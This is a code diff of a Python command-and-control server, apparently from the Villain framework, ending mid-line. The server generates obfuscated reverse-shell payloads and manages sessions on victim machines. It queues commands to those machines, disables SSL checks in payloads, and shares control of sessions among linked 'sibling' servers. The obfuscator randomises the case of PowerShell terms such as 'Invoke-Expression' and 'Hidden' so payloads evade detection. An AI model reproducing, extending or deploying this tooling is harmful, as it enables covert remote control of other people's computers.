@@ -2,16 +2,16 @@
 #
 # Author: Panagiotis Chartas (t3l3machus) | https://github.com/t3l3machus
 #
-# This script is part of the firaga framework.
+# This script is part of the Villain framework.
 
 
-import ssl, sys, argparse, base64, re, os, socket
+import ssl, sys, argparse, base64, re, os, socket, struct
 import netifaces as ni
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from warnings import filterwarnings
 from datetime import date, datetime
 from IPython.display import display
-from threading import Thread, Event, BoundedSemaphore
+from threading import Thread, BoundedSemaphore
 from time import sleep, time
 from ipaddress import ip_address
 from subprocess import check_output
@@ -93,7 +93,6 @@ class Payload_generator:
 				return
 					
 
-			
 			''' Parse OS '''
 			if 'os' in arguments:
 				if args_dict['os'].lower() in ['windows', 'linux', 'macos']:
@@ -220,12 +219,16 @@ class Payload_generator:
 
 			if not domain and Hoaxshell_settings.ssl_support:
 				disable_ssl_chk = self.read_file(f'{cwd}/payload_templates/{os_type}/disable_ssl_check')
-				payload = f'{disable_ssl_chk}{payload}'.strip()
+				payload = payload.replace('*DISABLE_SSL_CHK*', disable_ssl_chk)
+			
+			elif domain and Hoaxshell_settings.ssl_support:
+				payload = payload.replace('*DISABLE_SSL_CHK*', '')
 			
 			Sessions_manager.legit_session_ids[session_unique_id] = {
 				'OS Type' : args_dict['os'].capitalize(),
 				'constraint_mode' : self.boolean_args['constraint_mode'],
-				'frequency' : frequency
+				'frequency' : frequency,
+				'exec_outfile' : exec_outfile if exec_outfile else False
 			}
 			
 			payload = self.obfuscator.mask_payload(payload) if self.boolean_args['obfuscate'] else payload
@@ -493,7 +496,9 @@ class Obfuscator:
 
 
 		# Randomize char case of specified components
-		components = ['USERNAME', 'COMPUTERNAME', 'Out-String', 'Invoke-WebRequest', 'iwr', 'Stop', 'System.Text.Encoding', 'UTF8.GetBytes', 'sleep', 'Invoke-Expression', 'iex', 'Invoke-RestMethod', 'irm']
+		components = ['USERNAME', 'COMPUTERNAME', 'Out-String', 'Invoke-WebRequest', 'iwr', \
+		'Stop', 'System.Text.Encoding', 'UTF8.GetBytes', 'sleep', 'Invoke-Expression', 'iex', \
+		'Invoke-RestMethod', 'irm', 'Start-Process', 'Hidden']
 	
 		for i in range(0, len(components)):
 			rand_case = self.randomize_case(components[i])
@@ -520,7 +525,7 @@ class Sessions_manager:
 	
 	def list_sessions(self):
 		
-		if len(self.active_sessions.keys()):
+		if self.active_sessions.keys():
 			
 			print('\r')			
 			table = self.sessions_dict_to_list()
@@ -535,10 +540,11 @@ class Sessions_manager:
 	def sessions_dict_to_list(self):
 		
 		sessions_list = []
+		active_sessions_clone = self.active_sessions.copy()
 		
-		for session_id in self.active_sessions.keys():
+		for session_id in active_sessions_clone:
 			
-			tmp = self.active_sessions[session_id].copy()
+			tmp = active_sessions_clone[session_id]
 			corrupted = 0
 			
 			try:
@@ -557,6 +563,7 @@ class Sessions_manager:
 		return sessions_list
 		
 
+
 	@staticmethod
 	def return_session_owner_id(session_id):
 		
@@ -569,8 +576,11 @@ class Sessions_manager:
 
 	@staticmethod
 	def alias_to_session_id(alias):
+
+		active_sessions_clone = Sessions_manager.active_sessions.copy()
+		active_sessions = active_sessions_clone.keys()
 		
-		for session_id in Sessions_manager.active_sessions.keys():
+		for session_id in active_sessions:
 			if Sessions_manager.active_sessions[session_id]['aliased']:
 				if Sessions_manager.active_sessions[session_id]['alias'] == alias:
 					return session_id
@@ -582,16 +592,20 @@ class Sessions_manager:
 	def kill_session(self, session_id):
 		
 		if session_id in self.active_sessions.keys():
-			Hoaxshell.dropSession(session_id)
-			sleep(Hoaxshell_settings.default_frequency)
-			self.active_sessions.pop(session_id, None)
-			self.legit_session_ids.pop(session_id, None)
-			session_id_components = session_id.split('-')
-			Hoaxshell.verify.remove(session_id_components[0])
-			Hoaxshell.get_cmd.remove(session_id_components[1])
-			Hoaxshell.post_res.remove(session_id_components[2])
-			print('Session terminated.')
-			Core_server.announce_session_termination({'session_id' : session_id})
+			if self.active_sessions[session_id]['Owner'] == 'Self':
+				Hoaxshell.dropSession(session_id)
+				sleep(Hoaxshell_settings.default_frequency)
+				self.active_sessions.pop(session_id, None)
+				self.legit_session_ids.pop(session_id, None)
+				session_id_components = session_id.split('-')
+				Hoaxshell.verify.remove(session_id_components[0])
+				Hoaxshell.get_cmd.remove(session_id_components[1])
+				Hoaxshell.post_res.remove(session_id_components[2])
+				print(f'[{INFO}] Session terminated.')
+				Core_server.announce_session_termination({'session_id' : session_id})
+				
+			else:
+				print(f'[{FAILED}] Permission denied (session owned by sibling).')
 			
 		else:
 			print('Session invalid.')
@@ -616,20 +630,6 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	@staticmethod
 	def set_shell_prompt_ready():
 		Hoaxshell.prompt_ready = True
-
-
-	
-	def command_handler(self, command, session_id):
-		
-		if len(Sessions_manager.active_sessions.keys()):
-			
-			if command == "pwd": 
-				command = "split-path $pwd'\\0x00'"
-				
-			Hoaxshell.command_pool[session_id].append(command + ";pwd")
-
-		else:
-			print(f'\r[{INFO}] No active session.')		
 
 
 
@@ -760,7 +760,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 
 	@staticmethod
-	def rst_shell_prompt(force_rst = False, prompt = ' > ', prefix = '\r'):
+	def rst_shell_prompt(prompt = ' > ', prefix = '\r'):
 		
 		Hoaxshell.prompt_ready = True
 		sys.stdout.write(prefix + Hoaxshell.hoax_prompt + readline.get_line_buffer())
@@ -794,7 +794,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 					'IP Address' : self.client_address[0], 
 					'Port' : self.client_address[1],
 					'execution_verified' : False,
-					'Status' : f'Active',
+					'Status' : 'Active',
 					'last_received' : timestamp,
 					'OS Type' : Sessions_manager.legit_session_ids[session_id]['OS Type'],
 					'frequency' : Sessions_manager.legit_session_ids[session_id]['frequency'],
@@ -826,7 +826,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			
 			if Sessions_manager.active_sessions[session_id]['execution_verified']:
 				print(f'\r[{INFO}] Received "Verify execution" request from an already established session (ignored).')
-				Main_prompt.rst_prompt(force_rst = True) if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt(force_rst = True)
+				Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
 				return
 			
 			self.send_response(200)
@@ -837,8 +837,8 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			Sessions_manager.active_sessions[session_id]['execution_verified'] = True
 			Sessions_manager.active_sessions[session_id]['Computername'] = url_split[1]
 			Sessions_manager.active_sessions[session_id]['Username'] = url_split[2]
-			print(f'\r[{GREEN}Shell{END}] {BOLD}New session established! {END}[{ORANGE}{self.client_address[0]}{END}]')
-			Main_prompt.rst_prompt(force_rst = True) if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt(force_rst = True)
+			print(f'\r[{GREEN}Shell{END}][{ORANGE}{self.client_address[0]}{END}] {BOLD}New session established! {END}')
+			Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
 
 			try:				
 				Thread(target = self.monitor_shell_state, args = (session_id,), daemon = True).start()
@@ -910,10 +910,10 @@ class Hoaxshell(BaseHTTPRequestHandler):
 					
 					if isinstance(output, str):	
 						print(f'\r{GREEN}{output}{END}')
-						Main_prompt.rst_prompt(force_rst = True) if not self.active_shell else Hoaxshell.set_shell_prompt_ready()
+						Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()
 					
 					elif isinstance(output, list):
-						Core_server.send_receive_one_encrypted(output[0], output[1], 'command_output')
+						Core_server.send_receive_one_encrypted(output[0], output[1], 'command_output', 30)
 
 						
 				except ConnectionResetError:
@@ -922,10 +922,10 @@ class Hoaxshell(BaseHTTPRequestHandler):
 					
 					if isinstance(output, str):
 						print(error_msg)
-						Main_prompt.rst_prompt(force_rst = True) if not self.active_shell else Hoaxshell.set_shell_prompt_ready()
+						Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()
 						
 					elif isinstance(output, list):
-						Core_server.send_receive_one_encrypted(output[0], error_msg, 'command_output')
+						Core_server.send_receive_one_encrypted(output[0], error_msg, 'command_output', 30)
 						
 					del error_msg
 					
@@ -961,35 +961,41 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	def dropSession(session_id):
 		
 		os_type = Sessions_manager.active_sessions[session_id]['OS Type']
-		exit_command = 'exit' if os_type  == 'Windows' else 'echo byee'
+		outfile = Sessions_manager.legit_session_ids[session_id]['exec_outfile']
+		exit_command = 'stop-process $PID' if os_type  == 'Windows' else 'echo byee'
 		
-		if (os_type == 'Windows' and not exec_outfile) or os_type == 'Linux':
+		if (os_type == 'Windows' and not outfile) or os_type == 'Linux':
 			Hoaxshell.command_pool[session_id].append(exit_command)
 			
-		elif os_type == 'Windows' and exec_outfile:
-			Hoaxshell.command_pool[session_id].append(f'del {exec_outfile};{exit_command}')
+		elif os_type == 'Windows' and outfile:
+			Hoaxshell.command_pool[session_id].append(f'del {outfile};{exit_command}')
 		
-			
+
 
 	@staticmethod
 	def terminate():
-			
-		sessions = Sessions_manager.active_sessions.keys()
+
+		active_sessions_clone = Sessions_manager.active_sessions.copy()
+		active_sessions = active_sessions_clone.keys()			
 	
-		if len(sessions):
+		if active_sessions:
 			
 			print(f'\r[{INFO}] Terminating active sessions - DO NOT INTERRUPT...')		
 			
-			for session_id in sessions:
-				if Sessions_manager.active_sessions[session_id]['Owner'] == Core_server.SERVER_UNIQUE_ID:
-					Hoaxshell.dropSession(session_id)				
-					Core_server.announce_session_termination({'session_id' : session_id})
+			for session_id in active_sessions:
+				
+				try:					
+					if Sessions_manager.active_sessions[session_id]['Owner'] == Core_server.SERVER_UNIQUE_ID:
+						Hoaxshell.dropSession(session_id)				
+						Core_server.announce_session_termination({'session_id' : session_id})
+						
+				except:
+					continue
 			
 			sleep(Hoaxshell_settings.default_frequency + 2.0)
 			print(f'\r[{INFO}] Sessions terminated.')
 			
 		else:
-			# ~ stop_event.set()
 			sys.exit(0)
 
 
@@ -1084,203 +1090,263 @@ class Core_server:
 
 	def sock_handler(self, conn, address):
 		
-		try:
-			Threading_params.thread_limiter.acquire()
-			raw_data = conn.recv(Core_server_settings.CLIENT_BUFFER_SIZE)
-			Main_prompt.main_prompt_ready = False
+		# ~ try:
+			
+		Threading_params.thread_limiter.acquire()
+		raw_data = Core_server.recv_msg(conn)
+		#Main_prompt.main_prompt_ready = False
+		rst_prompt = True
 
-			# There are 3 predefined byte sequences for processing a sibling server's request to connect (something like a TCP handshake but significantly more stupid)
-			# Check if raw_data is a connection request
-			if raw_data in [self.CONNECT_SYN, self.CONNECT_DENY]:
-					
-				if raw_data == self.CONNECT_SYN:
-					
-					# Spam filter
-					if address[0] in self.acknowledged_servers:
-						conn.send(self.CONNECT_DENY)
-						conn.close()
-						return						
-					
-					request_id = ''.join(["{}".format(randint(0, 9)) for num in range(0, 5)])
-					self.requests[request_id] = False
-					# ~ response_choice = input(f"\r[{INFO}] Received request to connect from {ORANGE}{address}{END}. \nIf you wish to connect type {ORANGE}{self.SERVER_UNIQUE_ID[0:6]}{END} and press ENTER: ")
-					print(f"\r[{INFO}] Received request to connect from {ORANGE}{address[0]}{END}.")
-					print(f"\r[{INFO}] Type {ORANGE}{request_id}{END} and press ENTER to connect. You have 10 seconds.")
-					Main_prompt.rst_prompt(force_rst = True) if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt(force_rst = True)
-					
-					timeout_start = time()
-
-					while time() < timeout_start + 10:
+		# There are 3 predefined byte sequences for processing a sibling server's request to connect (something like a TCP handshake but significantly more stupid)
+		# Check if raw_data is a connection request
+		if raw_data in [self.CONNECT_SYN, self.CONNECT_DENY]:
 				
-						if self.requests[request_id]:							
-							del self.requests[request_id]
-							self.acknowledged_servers.append(address[0])
-							conn.send(self.CONNECT_ACK)							
-							break
-							
-					else:
+			if raw_data == self.CONNECT_SYN:
+				
+				# Spam filter
+				if address[0] in self.acknowledged_servers:
+					Core_server.send_msg(conn, self.CONNECT_DENY)
+					conn.close()
+					return						
+				
+				request_id = ''.join(["{}".format(randint(0, 9)) for num in range(0, 5)])
+				self.requests[request_id] = False
+				print(f"\r[{INFO}] Received request to connect from {ORANGE}{address[0]}{END}")
+				print(f"\r[{INFO}] Type {ORANGE}{request_id}{END} and press ENTER to connect. You have 10 seconds.")
+				Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
+				
+				timeout_start = time()
+
+				while time() < timeout_start + 10:
+			
+					if self.requests[request_id]:							
 						del self.requests[request_id]
-						conn.send(self.CONNECT_DENY)
-						conn.close()						
-						print(f"\r[{INFO}] Request to connect with {ORANGE}{address[0]}{END} denied.")
-						Main_prompt.rst_prompt(force_rst = True) if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt(force_rst = True)
-								
-				return
-					
-			
-			# If the sender's IP address is in the list of acknowledged for connection servers and the msg is a valid UUID4, then establish connection
-			elif address[0] in self.acknowledged_servers:
-
-				str_data = raw_data.decode('utf-8', 'ignore').strip()
-
-				# Try to interpret the clear text data
-				try:
-					tmp = str_data.split(':')
-					sibling_id = tmp[0]
-					sibling_server_port = tmp[1]
-					sibling_server_hostname = tmp[2]
-					
-				except:
-					sibling_id = None
+						self.acknowledged_servers.append(address[0])
+						Core_server.send_msg(conn, self.CONNECT_ACK)
+						break
+						
+				else:
+					del self.requests[request_id]
+					Core_server.send_msg(conn, self.CONNECT_DENY)
+					conn.close()						
+					print(f"\r[{INFO}] Request to connect with {ORANGE}{address[0]}{END} denied.")
+					Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
+							
+			return
 				
-				
-				if is_valid_uuid(sibling_id): #and (address[0] in self.acknowledged_servers)
-					
-					self.sibling_servers[sibling_id] = {'Hostname' : sibling_server_hostname, 'Server IP' : address[0], 'Server Port' : int(sibling_server_port)}
-					conn.send(f'{self.SERVER_UNIQUE_ID}:{self.HOSTNAME}'.encode("utf-8"))
-					self.acknowledged_servers.remove(address[0])
-					
-					# Synchronize all servers
-					self.synchronize_sibling_servers()
-					return
-				
-			else:
-				# Check if connection is coming from an acknowledged sibling server			
-				server_is_sibling = sibling_id = False
-				
-				if len(self.sibling_servers.keys()):
-					server_is_sibling = sibling_id = self.server_is_sibling(address[0])
-
-
-				# If the packet is coming from a sibling then it's encrypted and "encapsulated"
-				if server_is_sibling:
-					# ~ try: 
-					# AES KEY is the sender sibling server's ID and IV is the 16 first bytes of the (local host) server's ID		
-					decrypted_data = self.decrypt_encapsulated_msg(sibling_id, raw_data) # returns [capsule, received_data]
-
-					if decrypted_data[0] == 'synchronize_sibling_servers_table':
-
-						self.update_siblings_data_table(decrypted_data[1])
-						
-						# Return local sibling servers data
-						sibling_servers_data_local = str(self.encapsulate_dict(self.sibling_servers, decrypted_data[0]))
-						encrypted_siblings_data = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), sibling_servers_data_local, sibling_id[0:16].encode('utf-8'))
-						conn.send(encrypted_siblings_data)
-					
-					
-					
-					
-					elif decrypted_data[0] == 'synchronize_sibling_servers_shells':
-					
-						self.update_shell_sessions(decrypted_data[1])
-						
-						# Return local sibling servers data
-						sibling_servers_shells = str(self.encapsulate_dict(Sessions_manager.active_sessions, decrypted_data[0]))
-						encrypted_siblings_data = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), sibling_servers_shells, sibling_id[0:16].encode('utf-8'))
-						conn.send(encrypted_siblings_data)
-					
-					
-					
-					
-					elif decrypted_data[0] == 'exec_command':
-											
-						data = decrypted_data[1]
-						
-						# Check if session exists
-						if data['session_id'] in Sessions_manager.active_sessions.keys():																			
-							Hoaxshell.command_pool[data['session_id']].append(data['command'])
-							conn.send(self.response_ack(sibling_id))
-							
-							
-							
-							
-					elif decrypted_data[0] == 'command_output':
-						
-						print(f'\r{GREEN}{decrypted_data[1]}{END}')					
-						conn.send(self.response_ack(sibling_id))
-						
-						if Hoaxshell.active_shell:
-							Hoaxshell.prompt_ready = True
-
-
-
-
-					elif decrypted_data[0] == 'new_session':
-						
-						new_session_id = decrypted_data[1]['session_id']
-						decrypted_data[1].pop('session_id', None)
-						Sessions_manager.active_sessions[new_session_id] = decrypted_data[1]							
-						print(f'\r[{GREEN}Shell{END}] {BOLD}New session established! {END}[{ORANGE}{Sessions_manager.active_sessions[new_session_id]["IP Address"]}{END}] (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END})')
-						Main_prompt.rst_prompt(force_rst = True) if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt(force_rst = True)
-						del decrypted_data, new_session_id
-						
-						conn.send(self.response_ack(sibling_id))
-
-
-
-
-					elif decrypted_data[0] == 'shell_session_status_update':
-						
-						session_id = decrypted_data[1]['session_id']
-						Sessions_manager.active_sessions[session_id]['Status'] = decrypted_data[1]['Status']					
-						del session_id
-						
-						conn.send(self.response_ack(sibling_id))
-
-
-
-
-					elif decrypted_data[0] == 'session_terminated':
-						
-						victim_ip = Sessions_manager.active_sessions[decrypted_data[1]['session_id']]['IP Address']
-						Sessions_manager.active_sessions.pop(decrypted_data[1]['session_id'], None)					
-						print(f'\r[{WARN}] Session with {ORANGE}{victim_ip}{END} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END}) terminated.')
-						Main_prompt.rst_prompt(force_rst = True) if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt(force_rst = True)
-						del victim_ip
-						
-						conn.send(self.response_ack(sibling_id))
-
-
-
-					elif decrypted_data[0] == 'server_shutdown':
-						
-						server_ip = self.sibling_servers[decrypted_data[1]['sibling_id']]['Server IP']
-						hostname = self.sibling_servers[decrypted_data[1]['sibling_id']]['Hostname']
-						self.sibling_servers.pop(decrypted_data[1]['sibling_id'], None)					
-						print(f'\r[{WARN}] Sibling server {ORANGE}{server_ip}{END} (hostname: {ORANGE}{hostname}{END}) disconnected.')
-						Main_prompt.rst_prompt(force_rst = True) if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt(force_rst = True)
-						del server_ip, hostname
-								
-						conn.send(self.response_ack(sibling_id))					
-										
-
-
-					elif decrypted_data[0] == 'are_you_alive':
-						conn.send(self.response_ack(sibling_id))
-							
-									
-									
-					else:
-						return					
-
-			
-		except:
-			print('failed to process a request')
-			pass				
 		
-		Main_prompt.rst_prompt(force_rst = True) if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt(force_rst = True)
-		# ~ Main_prompt.rst_prompt(force_rst = True)
+		# If the sender's IP address is in the list of acknowledged for connection servers and the msg is a valid UUID4, then establish connection
+		elif address[0] in self.acknowledged_servers:
+
+			str_data = raw_data.decode('utf-8', 'ignore').strip()
+
+			# Try to interpret the clear text data
+			try:
+				tmp = str_data.split(':')
+				sibling_id = tmp[0]
+				sibling_server_port = tmp[1]
+				sibling_server_hostname = tmp[2]
+				
+			except:
+				sibling_id = None
+			
+			
+			if is_valid_uuid(sibling_id): #and (address[0] in self.acknowledged_servers)
+				
+				self.sibling_servers[sibling_id] = {'Hostname' : sibling_server_hostname, 'Server IP' : address[0], 'Server Port' : int(sibling_server_port), 'Status' : 'Active'}
+				Core_server.send_msg(conn, f'{self.SERVER_UNIQUE_ID}:{self.HOSTNAME}'.encode("utf-8"))
+				self.acknowledged_servers.remove(address[0])
+				
+				# Synchronize all servers
+				self.synchronize_sibling_servers()
+				return
+			
+		else:
+			# Check if connection is coming from an acknowledged sibling server			
+			server_is_sibling = sibling_id = False
+			
+			if self.sibling_servers.keys():
+				server_is_sibling = sibling_id = self.server_is_sibling(address[0])
+
+
+			# If the packet is coming from a sibling then it's encrypted and "encapsulated"
+			if server_is_sibling:
+
+				# AES KEY is the sender sibling server's ID and IV is the 16 first bytes of the (local host) server's ID		
+				decrypted_data = self.decrypt_encapsulated_msg(sibling_id, raw_data) # returns [capsule, received_data]
+
+				if decrypted_data[0] == 'synchronize_sibling_servers_table':
+
+					self.update_siblings_data_table(decrypted_data[1])
+					
+					# Return local sibling servers data
+					sibling_servers_data_local = str(self.encapsulate_dict(self.sibling_servers, decrypted_data[0]))
+					encrypted_siblings_data = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), sibling_servers_data_local, sibling_id[0:16].encode('utf-8'))
+					Core_server.send_msg(conn, encrypted_siblings_data)
+				
+				
+									
+				elif decrypted_data[0] == 'synchronize_sibling_servers_shells':
+				
+					self.update_shell_sessions(decrypted_data[1])
+					
+					# Return local sibling servers data
+					sibling_servers_shells = str(self.encapsulate_dict(Sessions_manager.active_sessions, decrypted_data[0]))
+					encrypted_siblings_data = encrypt_msg(self.SERVER_UNIQUE_ID.encode('utf-8'), sibling_servers_shells, sibling_id[0:16].encode('utf-8'))
+					Core_server.send_msg(conn, encrypted_siblings_data)
+				
+				
+								
+				elif decrypted_data[0] == 'exec_command':
+										
+					data = decrypted_data[1]
+					
+					# Check if session exists
+					if data['session_id'] in Sessions_manager.active_sessions.keys():																			
+						Hoaxshell.command_pool[data['session_id']].append(data['command'])
+						Core_server.send_msg(conn, self.response_ack(sibling_id))
+						# ~ rst_prompt = False
+						
+						
+												
+				elif decrypted_data[0] == 'command_output':
+					
+					print(f'\r{GREEN}{decrypted_data[1]}{END}')
+					Core_server.send_msg(conn, self.response_ack(sibling_id))
+					
+					if Hoaxshell.active_shell:
+						Hoaxshell.prompt_ready = True
+
+
+
+				elif decrypted_data[0] == 'new_session':
+					
+					new_session_id = decrypted_data[1]['session_id']
+					decrypted_data[1].pop('session_id', None)
+					Sessions_manager.active_sessions[new_session_id] = decrypted_data[1]							
+					print(f'\r[{GREEN}Shell{END}][{ORANGE}{Sessions_manager.active_sessions[new_session_id]["IP Address"]}{END}] {BOLD}New session established!{END} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END})')
+					Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
+					del decrypted_data, new_session_id						
+					Core_server.send_msg(conn, self.response_ack(sibling_id))
+
+
+
+				elif decrypted_data[0] == 'shell_session_status_update':
+					
+					session_id = decrypted_data[1]['session_id']
+					Sessions_manager.active_sessions[session_id]['Status'] = decrypted_data[1]['Status']					
+					del session_id						
+					Core_server.send_msg(conn, self.response_ack(sibling_id))
+					rst_prompt = False
+
+
+
+				elif decrypted_data[0] == 'session_terminated':
+					
+					victim_ip = Sessions_manager.active_sessions[decrypted_data[1]['session_id']]['IP Address']
+					Sessions_manager.active_sessions.pop(decrypted_data[1]['session_id'], None)					
+					print(f'\r[{WARN}] Session with {ORANGE}{victim_ip}{END} (Owned by \
+					{ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END}) terminated.')
+					Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
+					del victim_ip					
+					Core_server.send_msg(conn, self.response_ack(sibling_id))
+
+
+
+				elif decrypted_data[0] == 'server_shutdown':
+					
+					server_ip = self.sibling_servers[decrypted_data[1]['sibling_id']]['Server IP']
+					hostname = self.sibling_servers[decrypted_data[1]['sibling_id']]['Hostname']
+					self.sibling_servers.pop(decrypted_data[1]['sibling_id'], None)
+					
+					# Remove sessions associated with sibling server
+					active_sessions_clone = Sessions_manager.active_sessions.copy()
+					active_sessions = active_sessions_clone.keys()
+					lost_sessions = 0
+					
+					if active_sessions:
+						
+						for session_id in active_sessions:
+							
+							try:
+								if Sessions_manager.active_sessions[session_id]['Owner'] == decrypted_data[1]['sibling_id']:
+									del Sessions_manager.active_sessions[session_id]
+									lost_sessions += 1
+									
+							except:
+								continue
+															
+					print(f'\r[{WARN}] Sibling server {ORANGE}{server_ip}{END} (hostname: {ORANGE}{hostname}{END}) disconnected.')
+					print(f'\r[{WARN}] {lost_sessions} x shell sessions lost.') if lost_sessions else chill()
+					Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
+					del server_ip, hostname, active_sessions_clone, active_sessions
+					Core_server.send_msg(conn, self.response_ack(sibling_id))
+									
+									
+
+				elif decrypted_data[0] == 'are_you_alive':
+					Core_server.send_msg(conn, self.response_ack(sibling_id))
+					rst_prompt = False	
+				
+				else:
+					pass
+		
+		
+		# ~ except KeyboardInterrupt:
+			# ~ pass
+		
+		
+		# ~ except:
+			# ~ print('failed to process a request')
+			# ~ pass				
+				
+		conn.close()
+		
+		if rst_prompt:			
+			Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell \
+			else Hoaxshell.set_shell_prompt_ready()
+					
 		Threading_params.thread_limiter.release()
+		return
+
+
+
+	@staticmethod
+	def recv_msg(sock):
+		
+		raw_msglen = Core_server.recvall(sock, 4)
+		
+		if not raw_msglen:
+			return None
+			
+		msglen = struct.unpack('>I', raw_msglen)[0]
+
+		return Core_server.recvall(sock, msglen)
+		
+		
+		
+	@staticmethod
+	def recvall(sock, n):
+
+		data = bytearray()
+		
+		while len(data) < n:
+			packet = sock.recv(n - len(data))
+			
+			if not packet:
+				return None
+				
+			data.extend(packet)
+			
+		return data
+
+
+
+	@staticmethod
+	def send_msg(sock, msg):
+		msg = struct.pack('>I', len(msg)) + msg
+		sock.sendall(msg)
+
 
 		
 		
@@ -1292,7 +1358,7 @@ class Core_server:
 					
 		except OSError:
 			self.core_initialized = False
-			exit_with_msg(f'Core server failed to start. Port {Core_server_settings.bind_port} seems to already be in use.\n')
+			exit_with_msg(f'Core server failed to start. Port {Core_server_settings.bind_port} seems to be already in use.\n')
 		
 		except:
 			self.core_initialized = False
@@ -1306,7 +1372,7 @@ class Core_server:
 		
 		while self.listen:
 
-			conn, address = server_socket.accept()  # accept new connection
+			conn, address = server_socket.accept()
 			Thread(target = self.sock_handler, args = (conn, address)).start()
 			
 		conn.close()
@@ -1336,13 +1402,11 @@ class Core_server:
 
 	def list_siblings(self):
 		
-		if len(self.sibling_servers.keys()):
+		if self.sibling_servers.keys():
 			
 			print('\r')
-
 			table = self.siblings_dict_to_list()
-			print_table(table, ['Sibling ID', 'Server IP', 'Server Port', 'Hostname', 'Status'])
-			
+			print_table(table, ['Sibling ID', 'Server IP', 'Server Port', 'Hostname', 'Status'])			
 			print('\r')
 		
 		else:
@@ -1351,22 +1415,24 @@ class Core_server:
 	   
 
 	@staticmethod
-	def send_receive_one(msg, server_ip, server_port, encode_msg, timeout = 5):
+	def send_receive_one(msg, server_ip, server_port, encode_msg, timeout = 30):
 		
 		try:
 			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
 				client_socket.settimeout(timeout)
-			# ~ client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 				client_socket.connect((str(server_ip), int(server_port)))
 				msg = msg.encode('utf-8') if encode_msg else msg
-				client_socket.sendall(msg)
-				response_raw = client_socket.recv(Core_server_settings.CLIENT_BUFFER_SIZE)
+				Core_server.send_msg(client_socket, msg)
+				response_raw = Core_server.recv_msg(client_socket)
 				client_socket.close()
 				return response_raw
 					
 		except ConnectionRefusedError:
 			return 'connection_refused'
-
+		
+		except ConnectionResetError:
+			return 'connection_reset'
+			
 		except socket.timeout:
 			return 'timed_out'
 			
@@ -1397,10 +1463,9 @@ class Core_server:
 	@staticmethod
 	def announce_new_session(new_session_data_dict):
 		
-		siblings = Core_server.sibling_servers.keys()
+		siblings = clone_dict_keys(Core_server.sibling_servers)		
 		
-		if len(siblings):
-			
+		if siblings:			
 			for sibling_id in siblings:
 				Core_server.send_receive_one_encrypted(sibling_id, new_session_data_dict, 'new_session')
 
@@ -1409,10 +1474,9 @@ class Core_server:
 	@staticmethod
 	def announce_shell_session_stat_update(new_session_data_dict):
 		
-		siblings = Core_server.sibling_servers.keys()
+		siblings = clone_dict_keys(Core_server.sibling_servers)	
 		
-		if len(siblings):
-			
+		if siblings:			
 			for sibling_id in siblings:
 				Core_server.send_receive_one_encrypted(sibling_id, new_session_data_dict, 'shell_session_status_update')
 						
@@ -1465,14 +1529,16 @@ class Core_server:
 						
 
 
-	def server_is_sibling(self, server_ip, server_port = False): #, server_port
+	def server_is_sibling(self, server_ip, server_port = False):
 		
 		sibling_id = None
+		siblings = clone_dict_keys(self.sibling_servers)	
 		
-		for sibling in self.sibling_servers.keys():
+		for sibling in siblings:
 			
 			if server_port:
-				if self.sibling_servers[sibling]['Server IP'] == server_ip and self.sibling_servers[sibling]['Server Port'] == int(server_port):
+				if self.sibling_servers[sibling]['Server IP'] == server_ip and \
+				self.sibling_servers[sibling]['Server Port'] == int(server_port):
 					sibling_id = sibling
 					break
 					
@@ -1486,17 +1552,25 @@ class Core_server:
 
 
 	@staticmethod
-	def send_receive_one_encrypted(sibling_id, data_dict, capsule, timeout = 5):
+	def send_receive_one_encrypted(sibling_id, data_dict, capsule, timeout = 10):
 		
 		# AES KEY is the server's ID and IV is the 16 first bytes of the sibling's ID
 		server_unique_id = Core_server.return_server_uniq_id()
 		encapsulated_data = str(Core_server.encapsulate_dict(data_dict, capsule))
-		encapsulated_data_encrypted = encrypt_msg(server_unique_id.encode('utf-8'), encapsulated_data, sibling_id[0:16].encode('utf-8'))
-		encapsulated_response_data_encrypted = Core_server.send_receive_one(encapsulated_data_encrypted, Core_server.sibling_servers[sibling_id]['Server IP'], Core_server.sibling_servers[sibling_id]['Server Port'], encode_msg = False, timeout = timeout)
-		#print(f'Received-send-rcv-one-enc: {encapsulated_response_data_decrypted}')
+		
+		encapsulated_data_encrypted = encrypt_msg(server_unique_id.encode('utf-8'), encapsulated_data, \
+		sibling_id[0:16].encode('utf-8'))
+		
+		encapsulated_response_data_encrypted = Core_server.send_receive_one(encapsulated_data_encrypted, \
